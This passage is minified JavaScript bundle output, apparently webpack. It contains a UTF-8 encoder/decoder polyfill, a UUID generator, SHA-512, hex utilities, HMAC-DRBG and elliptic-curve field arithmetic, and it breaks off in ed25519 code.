o=-1;function s(t,e){if(t)throw TypeError("Decoder error");return e||65533}var a="utf-8";function c(t,e){if(!(this instanceof c))return new c(t,e);if((t=void 0!==t?String(t).toLowerCase():a)!==a)throw new Error("Encoding not supported. Only utf-8 is supported");e=n(e),this._streaming=!1,this._BOMseen=!1,this._decoder=null,this._fatal=Boolean(e.fatal),this._ignoreBOM=Boolean(e.ignoreBOM),Object.defineProperty(this,"encoding",{value:"utf-8"}),Object.defineProperty(this,"fatal",{value:this._fatal}),Object.defineProperty(this,"ignoreBOM",{value:this._ignoreBOM})}function u(t,e){if(!(this instanceof u))return new u(t,e);if((t=void 0!==t?String(t).toLowerCase():a)!==a)throw new Error("Encoding not supported. Only utf-8 is supported");e=n(e),this._streaming=!1,this._encoder=null,this._options={fatal:Boolean(e.fatal)},Object.defineProperty(this,"encoding",{value:"utf-8"})}function h(t){var e=t.fatal,n=0,i=0,a=0,c=128,u=191;this.handler=function(t,h){if(-1===h&&0!==a)return a=0,s(e);if(-1===h)return o;if(0===a){if(r(h,0,127))return h;if(r(h,194,223))a=1,n=h-192;else if(r(h,224,239))224===h&&(c=160),237===h&&(u=159),a=2,n=h-224;else{if(!r(h,240,244))return s(e);240===h&&(c=144),244===h&&(u=143),a=3,n=h-240}return n<<=6*a,null}if(!r(h,c,u))return n=a=i=0,c=128,u=191,t.prepend(h),s(e);if(c=128,u=191,n+=h-128<<6*(a-(i+=1)),i!==a)return null;var l=n;return n=a=i=0,l}}function l(t){t.fatal,this.handler=function(t,e){if(-1===e)return o;if(r(e,0,127))return e;var n,i;r(e,128,2047)?(n=1,i=192):r(e,2048,65535)?(n=2,i=224):r(e,65536,1114111)&&(n=3,i=240);for(var s=[(e>>6*n)+i];n>0;){var a=e>>6*(n-1);s.push(128|63&a),n-=1}return s}}c.prototype={decode:function(t,e){var r;r="object"==typeof t&&t instanceof ArrayBuffer?new Uint8Array(t):"object"==typeof t&&"buffer"in t&&t.buffer instanceof ArrayBuffer?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):new Uint8Array(0),e=n(e),this._streaming||(this._decoder=new h({fatal:this._fatal}),this._BOMseen=!1),this._streaming=Boolean(e.stream);for(var s,a=new i(r),c=[];!a.endOfStream()&&(s=this._decoder.handler(a,a.read()))!==o;)null!==s&&(Array.isArray(s)?c.push.apply(c,s):c.push(s));if(!this._streaming){do{if((s=this._decoder.handler(a,a.read()))===o)break;null!==s&&(Array.isArray(s)?c.push.apply(c,s):c.push(s))}while(!a.endOfStream());this._decoder=null}return c.length&&(-1===["utf-8"].indexOf(this.encoding)||this._ignoreBOM||this._BOMseen||(65279===c[0]?(this._BOMseen=!0,c.shift()):this._BOMseen=!0)),function(t){for(var e="",r=0;r<t.length;++r){var n=t[r];n<=65535?e+=String.fromCharCode(n):(n-=65536,e+=String.fromCharCode(55296+(n>>10),56320+(1023&n)))}return e}(c)}},u.prototype={encode:function(t,e){t=t?String(t):"",e=n(e),this._streaming||(this._encoder=new l(this._options)),this._streaming=Boolean(e.stream);for(var r,s=[],a=new i(function(t){for(var e=String(t),r=e.length,n=0,i=[];n<r;){var o=e.charCodeAt(n);if(o<55296||o>57343)i.push(o);else if(56320<=o&&o<=57343)i.push(65533);else if(55296<=o&&o<=56319)if(n===r-1)i.push(65533);else{var s=t.charCodeAt(n+1);if(56320<=s&&s<=57343){var a=1023&o,c=1023&s;i.push(65536+(a<<10)+c),n+=1}else i.push(65533)}n+=1}return i}(t));!a.endOfStream()&&(r=this._encoder.handler(a,a.read()))!==o;)Array.isArray(r)?s.push.apply(s,r):s.push(r);if(!this._streaming){for(;(r=this._encoder.handler(a,a.read()))!==o;)Array.isArray(r)?s.push.apply(s,r):s.push(r);this._encoder=null}return new Uint8Array(s)}},e.TextEncoder=u,e.TextDecoder=c},341:(t,e,r)=>{"use strict";var n;r.d(e,{v4:()=>h});var i=new Uint8Array(16);function o(){if(!n&&!(n="undefined"!=typeof crypto&&crypto.getRandomValues&&crypto.getRandomValues.bind(crypto)||"undefined"!=typeof msCrypto&&"function"==typeof msCrypto.getRandomValues&&msCrypto.getRandomValues.bind(msCrypto)))throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");return n(i)}const s=/^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;for(var a=[],c=0;c<256;++c)a.push((c+256).toString(16).substr(1));const u=function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,r=(a[t[e+0]]+a[t[e+1]]+a[t[e+2]]+a[t[e+3]]+"-"+a[t[e+4]]+a[t[e+5]]+"-"+a[t[e+6]]+a[t[e+7]]+"-"+a[t[e+8]]+a[t[e+9]]+"-"+a[t[e+10]]+a[t[e+11]]+a[t[e+12]]+a[t[e+13]]+a[t[e+14]]+a[t[e+15]]).toLowerCase();if(!function(t){return"string"==typeof t&&s.test(t)}(r))throw TypeError("Stringified UUID is invalid");return r},h=function(t,e,r){var n=(t=t||{}).random||(t.rng||o)();if(n[6]=15&n[6]|64,n[8]=63&n[8]|128,e){r=r||0;for(var i=0;i<16;++i)e[r+i]=n[i];return e}return u(n)}},790:()=>{},903:()=>{},394:()=>{}},e={};function r(n){var i=e[n];if(void 0!==i)return i.exports;var o=e[n]={id:n,loaded:!1,exports:{}};return t[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}r.amdO={},r.n=t=>{var e=t&&t.__esModule?()=>t.default:()=>t;return r.d(e,{a:e}),e},r.d=(t,e)=>{for(var n in e)r.o(e,n)&&!r.o(t,n)&&Object.defineProperty(t,n,{enumerable:!0,get:e[n]})},r.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(t){if("object"==typeof window)return window}}(),r.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e),r.r=t=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},r.nmd=t=>(t.paths=[],t.children||(t.children=[]),t),(()=>{"use strict";var t={};r.r(t),r.d(t,{aK:()=>st,e8:()=>H,DO:()=>F,dJ:()=>at,OG:()=>ct,My:()=>$,Ph:()=>X,lX:()=>Q,Id:()=>nt,fg:()=>lt,qj:()=>rt,aT:()=>Y,r4:()=>ot,aY:()=>q,x:()=>pt,lq:()=>tt,z:()=>et,zW:()=>V,Q5:()=>dt});var e={};r.r(e),r.d(e,{hasBrowserEnv:()=>dc,hasStandardBrowserEnv:()=>gc,hasStandardBrowserWebWorkerEnv:()=>mc,navigator:()=>pc,origin:()=>yc});var n=r(287);function i(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function o(t,...e){if(!((r=t)instanceof Uint8Array||ArrayBuffer.isView(r)&&"Uint8Array"===r.constructor.name))throw new Error("Uint8Array expected");var r;if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function s(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}const a="object"==typeof globalThis&&"crypto"in globalThis?globalThis.crypto:void 0,c=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),u=(t,e)=>t<<32-e|t>>>e;function h(t){return"string"==typeof t&&(t=function(t){if("string"!=typeof t)throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array((new TextEncoder).encode(t))}(t)),o(t),t}class l{clone(){return this._cloneInto()}}function f(t){const e=e=>t().update(h(e)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function d(t=32){if(a&&"function"==typeof a.getRandomValues)return a.getRandomValues(new Uint8Array(t));if(a&&"function"==typeof a.randomBytes)return a.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const p=(t,e,r)=>t&e^t&r^e&r;class g extends l{constructor(t,e,r,n){super(),this.blockLen=t,this.outputLen=e,this.padOffset=r,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(t),this.view=c(this.buffer)}update(t){s(this);const{view:e,buffer:r,blockLen:n}=this,i=(t=h(t)).length;for(let o=0;o<i;){const s=Math.min(n-this.pos,i-o);if(s!==n)r.set(t.subarray(o,o+s),this.pos),this.pos+=s,o+=s,this.pos===n&&(this.process(e,0),this.pos=0);else{const e=c(t);for(;n<=i-o;o+=n)this.process(e,o)}}return this.length+=t.length,this.roundClean(),this}digestInto(t){s(this),function(t,e){o(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}(t,this),this.finished=!0;const{buffer:e,view:r,blockLen:n,isLE:i}=this;let{pos:a}=this;e[a++]=128,this.buffer.subarray(a).fill(0),this.padOffset>n-a&&(this.process(r,0),a=0);for(let t=a;t<n;t++)e[t]=0;!function(t,e,r,n){if("function"==typeof t.setBigUint64)return t.setBigUint64(e,r,n);const i=BigInt(32),o=BigInt(4294967295),s=Number(r>>i&o),a=Number(r&o),c=n?4:0,u=n?0:4;t.setUint32(e+c,s,n),t.setUint32(e+u,a,n)}(r,n-8,BigInt(8*this.length),i),this.process(r,0);const u=c(t),h=this.outputLen;if(h%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=h/4,f=this.get();if(l>f.length)throw new Error("_sha2: outputLen bigger than state");for(let t=0;t<l;t++)u.setUint32(4*t,f[t],i)}digest(){const{buffer:t,outputLen:e}=this;this.digestInto(t);const r=t.slice(0,e);return this.destroy(),r}_cloneInto(t){t||(t=new this.constructor),t.set(...this.get());const{blockLen:e,buffer:r,length:n,finished:i,destroyed:o,pos:s}=this;return t.length=n,t.pos=s,t.finished=i,t.destroyed=o,n%e&&t.buffer.set(r),t}}const m=BigInt(2**32-1),y=BigInt(32);function w(t,e=!1){return e?{h:Number(t&m),l:Number(t>>y&m)}:{h:0|Number(t>>y&m),l:0|Number(t&m)}}const b=function(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l:s}=w(t[i],e);[r[i],n[i]]=[o,s]}return[r,n]},v=(t,e,r)=>t>>>r,k=(t,e,r)=>t<<32-r|e>>>r,S=(t,e,r)=>t>>>r|e<<32-r,A=(t,e,r)=>t<<32-r|e>>>r,E=(t,e,r)=>t<<64-r|e>>>r-32,_=(t,e,r)=>t>>>r-32|e<<64-r,B=function(t,e,r,n){const i=(e>>>0)+(n>>>0);return{h:t+r+(i/2**32|0)|0,l:0|i}},I=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0),x=(t,e,r,n)=>e+r+n+(t/2**32|0)|0,M=(t,e,r,n)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0),O=(t,e,r,n,i)=>e+r+n+i+(t/2**32|0)|0,T=(t,e,r,n,i,o)=>e+r+n+i+o+(t/2**32|0)|0,R=(t,e,r,n,i)=>(t>>>0)+(e>>>0)+(r>>>0)+(n>>>0)+(i>>>0),[P,C]=(()=>b(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map((t=>BigInt(t)))))(),L=new Uint32Array(80),N=new Uint32Array(80);class U extends g{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:t,Al:e,Bh:r,Bl:n,Ch:i,Cl:o,Dh:s,Dl:a,Eh:c,El:u,Fh:h,Fl:l,Gh:f,Gl:d,Hh:p,Hl:g}=this;return[t,e,r,n,i,o,s,a,c,u,h,l,f,d,p,g]}set(t,e,r,n,i,o,s,a,c,u,h,l,f,d,p,g){this.Ah=0|t,this.Al=0|e,this.Bh=0|r,this.Bl=0|n,this.Ch=0|i,this.Cl=0|o,this.Dh=0|s,this.Dl=0|a,this.Eh=0|c,this.El=0|u,this.Fh=0|h,this.Fl=0|l,this.Gh=0|f,this.Gl=0|d,this.Hh=0|p,this.Hl=0|g}process(t,e){for(let r=0;r<16;r++,e+=4)L[r]=t.getUint32(e),N[r]=t.getUint32(e+=4);for(let t=16;t<80;t++){const e=0|L[t-15],r=0|N[t-15],n=S(e,r,1)^S(e,r,8)^v(e,r,7),i=A(e,r,1)^A(e,r,8)^k(e,r,7),o=0|L[t-2],s=0|N[t-2],a=S(o,s,19)^E(o,s,61)^v(o,s,6),c=A(o,s,19)^_(o,s,61)^k(o,s,6),u=M(i,c,N[t-7],N[t-16]),h=O(u,n,a,L[t-7],L[t-16]);L[t]=0|h,N[t]=0|u}let{Ah:r,Al:n,Bh:i,Bl:o,Ch:s,Cl:a,Dh:c,Dl:u,Eh:h,El:l,Fh:f,Fl:d,Gh:p,Gl:g,Hh:m,Hl:y}=this;for(let t=0;t<80;t++){const e=S(h,l,14)^S(h,l,18)^E(h,l,41),w=A(h,l,14)^A(h,l,18)^_(h,l,41),b=h&f^~h&p,v=R(y,w,l&d^~l&g,C[t],N[t]),k=T(v,m,e,b,P[t],L[t]),M=0|v,O=S(r,n,28)^E(r,n,34)^E(r,n,39),U=A(r,n,28)^_(r,n,34)^_(r,n,39),z=r&i^r&s^i&s,D=n&o^n&a^o&a;m=0|p,y=0|g,p=0|f,g=0|d,f=0|h,d=0|l,({h,l}=B(0|c,0|u,0|k,0|M)),c=0|s,u=0|a,s=0|i,a=0|o,i=0|r,o=0|n;const j=I(M,U,D);r=x(j,k,O,z),n=0|j}({h:r,l:n}=B(0|this.Ah,0|this.Al,0|r,0|n)),({h:i,l:o}=B(0|this.Bh,0|this.Bl,0|i,0|o)),({h:s,l:a}=B(0|this.Ch,0|this.Cl,0|s,0|a)),({h:c,l:u}=B(0|this.Dh,0|this.Dl,0|c,0|u)),({h,l}=B(0|this.Eh,0|this.El,0|h,0|l)),({h:f,l:d}=B(0|this.Fh,0|this.Fl,0|f,0|d)),({h:p,l:g}=B(0|this.Gh,0|this.Gl,0|p,0|g)),({h:m,l:y}=B(0|this.Hh,0|this.Hl,0|m,0|y)),this.set(r,n,i,o,s,a,c,u,h,l,f,d,p,g,m,y)}roundClean(){L.fill(0),N.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const z=f((()=>new U)),D=BigInt(0),j=BigInt(1),W=BigInt(2);function q(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name}function F(t){if(!q(t))throw new Error("Uint8Array expected")}function H(t,e){if("boolean"!=typeof e)throw new Error(t+" boolean expected, got "+e)}const K=Array.from({length:256},((t,e)=>e.toString(16).padStart(2,"0")));function $(t){F(t);let e="";for(let r=0;r<t.length;r++)e+=K[t[r]];return e}function V(t){const e=t.toString(16);return 1&e.length?"0"+e:e}function G(t){if("string"!=typeof t)throw new Error("hex string expected, got "+typeof t);return""===t?D:BigInt("0x"+t)}const J={_0:48,_9:57,A:65,F:70,a:97,f:102};function Z(t){return t>=J._0&&t<=J._9?t-J._0:t>=J.A&&t<=J.F?t-(J.A-10):t>=J.a&&t<=J.f?t-(J.a-10):void 0}function Y(t){if("string"!=typeof t)throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let e=0,i=0;e<r;e++,i+=2){const r=Z(t.charCodeAt(i)),o=Z(t.charCodeAt(i+1));if(void 0===r||void 0===o){const e=t[i]+t[i+1];throw new Error('hex string expected, got non-hex character "'+e+'" at index '+i)}n[e]=16*r+o}return n}function X(t){return G($(t))}function Q(t){return F(t),G($(Uint8Array.from(t).reverse()))}function tt(t,e){return Y(t.toString(16).padStart(2*e,"0"))}function et(t,e){return tt(t,e).reverse()}function rt(t,e,r){let n;if("string"==typeof e)try{n=Y(e)}catch(e){throw new Error(t+" must be hex string or Uint8Array, cause: "+e)}else{if(!q(e))throw new Error(t+" must be hex string or Uint8Array");n=Uint8Array.from(e)}const i=n.length;if("number"==typeof r&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function nt(...t){let e=0;for(let r=0;r<t.length;r++){const n=t[r];F(n),e+=n.length}const r=new Uint8Array(e);for(let e=0,n=0;e<t.length;e++){const i=t[e];r.set(i,n),n+=i.length}return r}const it=t=>"bigint"==typeof t&&D<=t;function ot(t,e,r){return it(t)&&it(e)&&it(r)&&e<=t&&t<r}function st(t,e,r,n){if(!ot(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function at(t){let e;for(e=0;t>D;t>>=j,e+=1);return e}const ct=t=>(W<<BigInt(t-1))-j,ut=t=>new Uint8Array(t),ht=t=>Uint8Array.from(t);function lt(t,e,r){if("number"!=typeof t||t<2)throw new Error("hashLen must be a number");if("number"!=typeof e||e<2)throw new Error("qByteLen must be a number");if("function"!=typeof r)throw new Error("hmacFn must be a function");let n=ut(t),i=ut(t),o=0;const s=()=>{n.fill(1),i.fill(0),o=0},a=(...t)=>r(i,n,...t),c=(t=ut())=>{i=a(ht([0]),t),n=a(),0!==t.length&&(i=a(ht([1]),t),n=a())},u=()=>{if(o++>=1e3)throw new Error("drbg: tried 1000 values");let t=0;const r=[];for(;t<e;){n=a();const e=n.slice();r.push(e),t+=n.length}return nt(...r)};return(t,e)=>{let r;for(s(),c(t);!(r=e(u()));)c();return s(),r}}const ft={bigint:t=>"bigint"==typeof t,function:t=>"function"==typeof t,boolean:t=>"boolean"==typeof t,string:t=>"string"==typeof t,stringOrUint8Array:t=>"string"==typeof t||q(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>"function"==typeof t&&Number.isSafeInteger(t.outputLen)};function dt(t,e,r={}){const n=(e,r,n)=>{const i=ft[r];if("function"!=typeof i)throw new Error("invalid validator function");const o=t[e];if(!(n&&void 0===o||i(o,t)))throw new Error("param "+String(e)+" is invalid. Expected "+r+", got "+o)};for(const[t,r]of Object.entries(e))n(t,r,!1);for(const[t,e]of Object.entries(r))n(t,e,!0);return t}function pt(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(void 0!==i)return i;const o=t(r,...n);return e.set(r,o),o}}const gt=BigInt(0),mt=BigInt(1),yt=BigInt(2),wt=BigInt(3),bt=BigInt(4),vt=BigInt(5),kt=BigInt(8);function St(t,e){const r=t%e;return r>=gt?r:e+r}function At(t,e,r){if(e<gt)throw new Error("invalid exponent, negatives unsupported");if(r<=gt)throw new Error("invalid modulus");if(r===mt)return gt;let n=mt;for(;e>gt;)e&mt&&(n=n*t%r),t=t*t%r,e>>=mt;return n}function Et(t,e,r){let n=t;for(;e-- >gt;)n*=n,n%=r;return n}function _t(t,e){if(t===gt)throw new Error("invert: expected non-zero number");if(e<=gt)throw new Error("invert: expected positive modulus, got "+e);let r=St(t,e),n=e,i=gt,o=mt,s=mt,a=gt;for(;r!==gt;){const t=n/r,e=n%r,c=i-s*t,u=o-a*t;n=r,r=e,i=s,o=a,s=c,a=u}if(n!==mt)throw new Error("invert: does not exist");return St(i,e)}const Bt=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function It(t,e){const r=void 0!==e?e:t.toString(2).length;return{nBitLength:r,nByteLength:Math.ceil(r/8)}}function xt(t,e,r=!1,n={}){if(t<=gt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:o}=It(t,e);if(o>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let s;const a=Object.freeze({ORDER:t,BITS:i,BYTES:o,MASK:ct(i),ZERO:gt,ONE:mt,create:e=>St(e,t),isValid:e=>{if("bigint"!=typeof e)throw new Error("invalid field element: expected bigint, got "+typeof e);return gt<=e&&e<t},is0:t=>t===gt,isOdd:t=>(t&mt)===mt,neg:e=>St(-e,t),eql:(t,e)=>t===e,sqr:e=>St(e*e,t),add:(e,r)=>St(e+r,t),sub:(e,r)=>St(e-r,t),mul:(e,r)=>St(e*r,t),pow:(t,e)=>function(t,e,r){if(r<gt)throw new Error("invalid exponent, negatives unsupported");if(r===gt)return t.ONE;if(r===mt)return e;let n=t.ONE,i=e;for(;r>gt;)r&mt&&(n=t.mul(n,i)),i=t.sqr(i),r>>=mt;return n}(a,t,e),div:(e,r)=>St(e*_t(r,t),t),sqrN:t=>t*t,addN:(t,e)=>t+e,subN:(t,e)=>t-e,mulN:(t,e)=>t*e,inv:e=>_t(e,t),sqrt:n.sqrt||(e=>(s||(s=function(t){if(t%bt===wt){const e=(t+mt)/bt;return function(t,r){const n=t.pow(r,e);if(!t.eql(t.sqr(n),r))throw new Error("Cannot find square root");return n}}if(t%kt===vt){const e=(t-vt)/kt;return function(t,r){const n=t.mul(r,yt),i=t.pow(n,e),o=t.mul(r,i),s=t.mul(t.mul(o,yt),i),a=t.mul(o,t.sub(s,t.ONE));if(!t.eql(t.sqr(a),r))throw new Error("Cannot find square root");return a}}return function(t){const e=(t-mt)/yt;let r,n,i;for(r=t-mt,n=0;r%yt===gt;r/=yt,n++);for(i=yt;i<t&&At(i,e,t)!==t-mt;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(1===n){const e=(t+mt)/bt;return function(t,r){const n=t.pow(r,e);if(!t.eql(t.sqr(n),r))throw new Error("Cannot find square root");return n}}const o=(r+mt)/yt;return function(t,s){if(t.pow(s,e)===t.neg(t.ONE))throw new Error("Cannot find square root");let a=n,c=t.pow(t.mul(t.ONE,i),r),u=t.pow(s,o),h=t.pow(s,r);for(;!t.eql(h,t.ONE);){if(t.eql(h,t.ZERO))return t.ZERO;let e=1;for(let r=t.sqr(h);e<a&&!t.eql(r,t.ONE);e++)r=t.sqr(r);const r=t.pow(c,mt<<BigInt(a-e-1));c=t.sqr(r),u=t.mul(u,r),h=t.mul(h,c),a=e}return u}}(t)}(t)),s(a,e))),invertBatch:t=>function(t,e){const r=new Array(e.length),n=e.reduce(((e,n,i)=>t.is0(n)?e:(r[i]=e,t.mul(e,n))),t.ONE),i=t.inv(n);return e.reduceRight(((e,n,i)=>t.is0(n)?e:(r[i]=t.mul(e,r[i]),t.mul(e,n))),i),r}(a,t),cmov:(t,e,r)=>r?e:t,toBytes:t=>r?et(t,o):tt(t,o),fromBytes:t=>{if(t.length!==o)throw new Error("Field.fromBytes: expected "+o+" bytes, got "+t.length);return r?Q(t):X(t)}});return Object.freeze(a)}function Mt(t){if("bigint"!=typeof t)throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function Ot(t){const e=Mt(t);return e+Math.ceil(e/2)}const Tt=BigInt(0),Rt=BigInt(1);function Pt(t,e){const r=e.negate();return t?r:e}function Ct(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Lt(t,e){return Ct(t,e),{windows:Math.ceil(e/t)+1,windowSize:2**(t-1)}}const Nt=new WeakMap,Ut=new WeakMap;function zt(t){return Ut.get(t)||1}function Dt(t,e){return{constTimeNegate:Pt,hasPrecomputes:t=>1!==zt(t),unsafeLadder(e,r,n=t.ZERO){let i=e;for(;r>Tt;)r&Rt&&(n=n.add(i)),i=i.double(),r>>=Rt;return n},precomputeWindow(t,r){const{windows:n,windowSize:i}=Lt(r,e),o=[];let s=t,a=s;for(let t=0;t<n;t++){a=s,o.push(a);for(let t=1;t<i;t++)a=a.add(s),o.push(a);s=a.double()}return o},wNAF(r,n,i){const{windows:o,windowSize:s}=Lt(r,e);let a=t.ZERO,c=t.BASE;const u=BigInt(2**r-1),h=2**r,l=BigInt(r);for(let t=0;t<o;t++){const e=t*s;let r=Number(i&u);i>>=l,r>s&&(r-=h,i+=Rt);const o=e,f=e+Math.abs(r)-1,d=t%2!=0,p=r<0;0===r?c=c.add(Pt(d,n[o])):a=a.add(Pt(p,n[f]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,o=t.ZERO){const{windows:s,windowSize:a}=Lt(r,e),c=BigInt(2**r-1),u=2**r,h=BigInt(r);for(let t=0;t<s;t++){const e=t*a;if(i===Tt)break;let r=Number(i&c);if(i>>=h,r>a&&(r-=u,i+=Rt),0===r)continue;let s=n[e+Math.abs(r)-1];r<0&&(s=s.negate()),o=o.add(s)}return o},getPrecomputes(t,e,r){let n=Nt.get(e);return n||(n=this.precomputeWindow(e,t),1!==t&&Nt.set(e,r(n))),n},wNAFCached(t,e,r){const n=zt(t);return this.wNAF(n,this.getPrecomputes(n,t,r),e)},wNAFCachedUnsafe(t,e,r,n){const i=zt(t);return 1===i?this.unsafeLadder(t,e,n):this.wNAFUnsafe(i,this.getPrecomputes(i,t,r),e,n)},setWindowSize(t,r){Ct(r,e),Ut.set(t,r),Nt.delete(t)}}}function jt(t,e,r,n){if(function(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach(((t,r)=>{if(!(t instanceof e))throw new Error("invalid point at index "+r)}))}(r,t),function(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach(((t,r)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+r)}))}(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,o=at(BigInt(r.length)),s=o>12?o-3:o>4?o-2:o?2:1,a=(1<<s)-1,c=new Array(a+1).fill(i);let u=i;for(let t=Math.floor((e.BITS-1)/s)*s;t>=0;t-=s){c.fill(i);for(let e=0;e<n.length;e++){const i=n[e],o=Number(i>>BigInt(t)&BigInt(a));c[o]=c[o].add(r[e])}let e=i;for(let t=c.length-1,r=i;t>0;t--)r=r.add(c[t]),e=e.add(r);if(u=u.add(e),0!==t)for(let t=0;t<s;t++)u=u.double()}return u}function Wt(t){return dt(t.Fp,Bt.reduce(((t,e)=>(t[e]="function",t)),{ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"})),dt(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...It(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const qt=BigInt(0),Ft=BigInt(1),Ht=BigInt(2),Kt=BigInt(8),$t={zip215:!0};const Vt=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),Gt=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752"),Jt=(BigInt(0),BigInt(1)),Zt=BigInt(2),Yt=(BigInt(3),BigInt(5)),Xt=BigInt(8);function Qt(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function te(t,e){const r=Vt,n=St(e*e*e,r),i=St(n*n*e,r);let o=St(t*n*function(t){const e=BigInt(10),r=BigInt(20),n=BigInt(40),i=BigInt(80),o=Vt,s=t*t%o*t%o,a=Et(s,Zt,o)*s%o,c=Et(a,Jt,o)*t%o,u=Et(c,Yt,o)*c%o,h=Et(u,e,o)*u%o,l=Et(h,r,o)*h%o,f=Et(l,n,o)*l%o,d=Et(f,i,o)*f%o,p=Et(d,i,o)*f%o,g=Et(p,e,o)*u%o;return{pow_p_5_8:Et(g,Zt,o)*t%o,b2:s}}(t*i).pow_p_5_8,r);const s=St(e*o*o,r),a=o,c=St(o*Gt,r),u=s===t,h=s===St(-t,r),l=s===St(-t*Gt,r);return 